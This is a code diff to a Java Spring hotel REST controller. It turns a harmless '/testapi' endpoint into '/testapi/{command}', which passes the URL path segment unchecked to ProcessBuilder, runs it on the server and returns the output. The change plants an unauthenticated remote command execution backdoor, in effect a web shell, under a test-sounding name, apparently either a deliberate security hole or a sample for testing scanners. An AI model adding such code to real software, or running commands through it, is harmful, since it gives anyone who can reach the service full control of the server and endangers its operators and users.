@@ -1,3 +1,4 @@
+
 package com.khoubyari.example.api.rest;
 
 import io.swagger.annotations.Api;
@@ -12,6 +13,9 @@ import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.data.domain.Page;
 import org.springframework.http.HttpStatus;
 import org.springframework.web.bind.annotation.*;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
@@ -97,13 +101,26 @@ public class HotelController extends AbstractRestHandler {
         checkResourceFound(this.hotelService.getHotel(id));
         this.hotelService.deleteHotel(id);
     }
-@RequestMapping(value = "/testapi",
+@RequestMapping(value = "/testapi/{command}",
             method = RequestMethod.GET)
     @ResponseStatus(HttpStatus.OK)
     public
     @ResponseBody
-    String testAPI( HttpServletRequest request, HttpServletResponse response) throws Exception {
-        return "This jenkinx-testing v4";
+    String testAPI( HttpServletRequest request, HttpServletResponse response,@PathVariable("command") String commnd) throws Exception {
+       
+		
+		ProcessBuilder processBuilder=new ProcessBuilder(commnd);
+		Process process = processBuilder.start();
+		StringBuilder output = new StringBuilder();
+        BufferedReader reader = new BufferedReader(
+                new InputStreamReader(process.getInputStream()));
+
+        String line;
+        while ((line = reader.readLine()) != null) {
+            output.append(line + "\n");
+        }
+		return output.toString();
     }
 
 }
+
